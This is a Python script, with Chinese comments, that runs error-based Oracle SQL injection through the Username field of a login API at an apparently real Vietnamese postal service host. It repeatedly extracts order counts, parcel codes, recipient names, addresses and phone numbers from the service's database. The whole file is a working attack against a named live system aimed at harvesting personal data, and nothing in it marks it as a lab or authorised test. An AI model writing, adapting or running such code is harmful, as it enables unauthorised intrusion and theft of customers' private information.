#!/usr/bin/env python3
"""
分析为什么这么多订单没有电话号码
"""

import requests
import json
import time

class NoPhoneAnalyzer:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        })
    
    def inject(self, payload):
        """发送SQL注入payload"""
        data = {"Username": payload, "Password": "test"}
        try:
            response = self.session.post(
                self.target_url,
                data=json.dumps(data),
                timeout=30
            )
            return response
        except:
            return None
    
    def extract_via_error(self, query):
        """使用Error-based注入提取数据"""
        payload = (
            f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
            f"1325=CTXSYS.DRITHSX.SN(1325,"
            f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
            f"({query})||"
            f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        )
        
        response = self.inject(payload)
        if response:
            text = response.text
            try:
                if 'qjvjq' in text and 'qkvzq' in text:
                    start = text.index('qjvjq') + 5
                    end = text.index('qkvzq', start)
                    return text[start:end]
            except:
                pass
        return None
    
    def analyze_no_phone_orders(self):
        """分析没有电话的订单"""
        print("=" * 80)
        print("🔍 分析没有收件人电话的订单")
        print("=" * 80)
        
        date = '20251010'
        
        queries = [
            ("总订单数", 
             f"SELECT COUNT(*) FROM EMS.E1E2_PH WHERE NGAY='{date}'"),
            
            ("有电话的订单", 
             f"SELECT COUNT(*) FROM EMS.E1E2_PH WHERE NGAY='{date}' AND DIENTHOAINHAN IS NOT NULL"),
            
            ("电话为NULL的订单", 
             f"SELECT COUNT(*) FROM EMS.E1E2_PH WHERE NGAY='{date}' AND DIENTHOAINHAN IS NULL"),
            
            ("电话为空字符串的订单", 
             f"SELECT COUNT(*) FROM EMS.E1E2_PH WHERE NGAY='{date}' AND DIENTHOAINHAN=''"),
            
            ("不同MABC总数", 
             f"SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH WHERE NGAY='{date}'"),
            
            ("有电话的不同MABC", 
             f"SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH WHERE NGAY='{date}' AND DIENTHOAINHAN IS NOT NULL"),
            
            ("无电话的不同MABC", 
             f"SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH WHERE NGAY='{date}' AND DIENTHOAINHAN IS NULL"),
        ]
        
        results = {}
        
        for name, query in queries:
            print(f"\n🔎 {name}:")
            result = self.extract_via_error(query)
            if result:
                print(f"   ✅ {result}")
                results[name] = int(result) if result.isdigit() else result
            else:
                print(f"   ❌ 查询失败")
            time.sleep(1.5)
        
        return results
    
    def check_phone_in_other_tables(self):
        """检查其他表是否有电话"""
        print("\n" + "=" * 80)
        print("🔍 检查无电话订单在其他表的情况")
        print("=" * 80)
        
        date = '20251010'
        
        # 获取一个没有电话的MABC
        query_mabc = f"SELECT MABC FROM EMS.E1E2_PH WHERE NGAY='{date}' AND DIENTHOAINHAN IS NULL AND ROWNUM=1"
        print("\n🔎 获取一个无电话订单的MABC:")
        mabc = self.extract_via_error(query_mabc)
        if mabc:
            print(f"   样本MABC: {mabc}")
            
            # 查看这个MABC的详细信息
            print(f"\n🔎 查询MABC={mabc}在各表的信息:")
            
            # E1E2_PH表
            query1 = f"SELECT NGUOINHAN FROM EMS.E1E2_PH WHERE MABC='{mabc}' AND NGAY='{date}' AND ROWNUM=1"
            name1 = self.extract_via_error(query1)
            if name1:
                print(f"   E1E2_PH表收件人: {name1}")
            
            # TEMP_DATA2_LOG表
            query2 = f"SELECT DIENTHOAINHAN FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE MABC='{mabc}' AND ROWNUM=1"
            phone2 = self.extract_via_error(query2)
            if phone2:
                print(f"   TEMP_DATA2_LOG表电话: {phone2}")
            else:
                print(f"   TEMP_DATA2_LOG表: 无数据")
            
            # SHIPMENT表
            query3 = f"SELECT RECEIVER_PHONE FROM EMS.SHIPMENT WHERE CODE LIKE '%{mabc}%' AND ROWNUM=1"
            phone3 = self.extract_via_error(query3)
            if phone3:
                print(f"   SHIPMENT表电话: {phone3}")
            else:
                print(f"   SHIPMENT表: 无数据")
            
            time.sleep(2)
    
    def analyze_no_phone_patterns(self):
        """分析无电话订单的特征"""
        print("\n" + "=" * 80)
        print("📊 无电话订单的特征分析")
        print("=" * 80)
        
        date = '20251010'
        
        queries = [
            ("无电话但有姓名", 
             f"SELECT COUNT(*) FROM EMS.E1E2_PH WHERE NGAY='{date}' AND DIENTHOAINHAN IS NULL AND NGUOINHAN IS NOT NULL"),
            
            ("无电话但有地址", 
             f"SELECT COUNT(*) FROM EMS.E1E2_PH WHERE NGAY='{date}' AND DIENTHOAINHAN IS NULL AND DIACHI IS NOT NULL"),
            
            ("无电话但有代收金额", 
             f"SELECT COUNT(*) FROM EMS.E1E2_PH WHERE NGAY='{date}' AND DIENTHOAINHAN IS NULL AND SO_TIEN_THU_HO>0"),
            
            ("无电话但有发件人电话", 
             f"SELECT COUNT(*) FROM EMS.E1E2_PH WHERE NGAY='{date}' AND DIENTHOAINHAN IS NULL AND DIENTHOAIGUI IS NOT NULL"),
            
            ("完全没有收件人信息（姓名+电话+地址都没有）", 
             f"SELECT COUNT(*) FROM EMS.E1E2_PH WHERE NGAY='{date}' AND DIENTHOAINHAN IS NULL AND NGUOINHAN IS NULL AND DIACHI IS NULL"),
        ]
        
        for name, query in queries:
            print(f"\n🔎 {name}:")
            result = self.extract_via_error(query)
            if result:
                print(f"   ✅ {result}")
            else:
                print(f"   ❌ 查询失败")
            time.sleep(1.5)
    
    def check_mabc_duplication(self):
        """检查MABC重复情况"""
        print("\n" + "=" * 80)
        print("🔍 检查MABC重复导致记录数膨胀")
        print("=" * 80)
        
        date = '20251010'
        
        # 检查重复最多的MABC
        print("\n🔎 查看MABC重复情况:")
        
        queries = [
            ("总记录数", 
             f"SELECT COUNT(*) FROM EMS.E1E2_PH WHERE NGAY='{date}'"),
            
            ("不同MABC数", 
             f"SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH WHERE NGAY='{date}'"),
            
            ("平均每个MABC的记录数", 
             "计算中..."),
        ]
        
        total = 0
        distinct = 0
        
        for name, query in queries:
            if name == "平均每个MABC的记录数":
                if total > 0 and distinct > 0:
                    avg = total / distinct
                    print(f"\n🔎 {name}:")
                    print(f"   ✅ {avg:.1f} 条/MABC")
                continue
            
            print(f"\n🔎 {name}:")
            result = self.extract_via_error(query)
            if result:
                print(f"   ✅ {result}")
                if name == "总记录数":
                    total = int(result)
                elif name == "不同MABC数":
                    distinct = int(result)
            time.sleep(1.5)
    
    def sample_no_phone_orders(self):
        """查看无电话订单样本"""
        print("\n" + "=" * 80)
        print("📋 无电话订单样本")
        print("=" * 80)
        
        date = '20251010'
        
        print("\n🔎 前5个无电话订单:")
        for i in range(1, 6):
            print(f"\n样本 {i}:")
            
            # MABC
            query_mabc = f"SELECT MABC FROM (SELECT MABC, ROWNUM AS RN FROM EMS.E1E2_PH WHERE NGAY='{date}' AND DIENTHOAINHAN IS NULL) WHERE RN={i}"
            mabc = self.extract_via_error(query_mabc)
            if mabc:
                print(f"  MABC: {mabc}")
                
                # 收件人
                query_name = f"SELECT NGUOINHAN FROM EMS.E1E2_PH WHERE MABC='{mabc}' AND NGAY='{date}' AND ROWNUM=1"
                name = self.extract_via_error(query_name)
                if name:
                    print(f"  收件人: {name}")
                
                # 地址
                query_addr = f"SELECT DIACHI FROM EMS.E1E2_PH WHERE MABC='{mabc}' AND NGAY='{date}' AND ROWNUM=1"
                addr = self.extract_via_error(query_addr)
                if addr and addr != 'NULL':
                    print(f"  地址: {addr[:50]}..." if len(addr) > 50 else f"  地址: {addr}")
                
                # 发件人电话
                query_sender = f"SELECT DIENTHOAIGUI FROM EMS.E1E2_PH WHERE MABC='{mabc}' AND NGAY='{date}' AND ROWNUM=1"
                sender = self.extract_via_error(query_sender)
                if sender and sender != 'NULL':
                    print(f"  发件人电话: {sender}")
                
                time.sleep(2)
    
    def run_all_analysis(self):
        """运行所有分析"""
        print("=" * 80)
        print("🔍 无电话订单深度分析工具")
        print("=" * 80)
        
        # 测试连接
        print("\n🔌 测试连接...")
        response = self.inject("admin")
        if not response:
            print("❌ 无法连接到目标")
            return
        print(f"✅ 连接成功")
        
        # 执行分析
        results = self.analyze_no_phone_orders()
        self.check_mabc_duplication()
        self.analyze_no_phone_patterns()
        self.sample_no_phone_orders()
        self.check_phone_in_other_tables()
        
        # 总结
        print("\n" + "=" * 80)
        print("📊 分析总结")
        print("=" * 80)
        
        total = results.get("总订单数", 0)
        has_phone = results.get("有电话的订单", 0)
        no_phone = results.get("电话为NULL的订单", 0)
        distinct_mabc = results.get("不同MABC总数", 0)
        
        if total > 0:
            print(f"\n总记录数: {total:,}")
            print(f"不同运单号: {distinct_mabc:,}")
            print(f"平均每个运单: {total/distinct_mabc:.1f} 条记录")
            print(f"\n有电话: {has_phone:,} ({has_phone/total*100:.1f}%)")
            print(f"无电话: {no_phone:,} ({no_phone/total*100:.1f}%)")
            
            print("\n💡 可能的原因：")
            print("  1. 同一个MABC有多条记录（状态更新、转运记录等）")
            print("  2. 只有部分记录类型需要填写电话")
            print("  3. 内部转运、中转记录不需要收件人电话")
            print("  4. 数据同步延迟，电话信息还未更新")
            print("  5. 某些业务类型（如企业批量寄件）不记录个人电话")
        
        print("\n" + "=" * 80)
        print("🎉 分析完成！")
        print("=" * 80)

if __name__ == "__main__":
    target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
    analyzer = NoPhoneAnalyzer(target_url)
    analyzer.run_all_analysis()
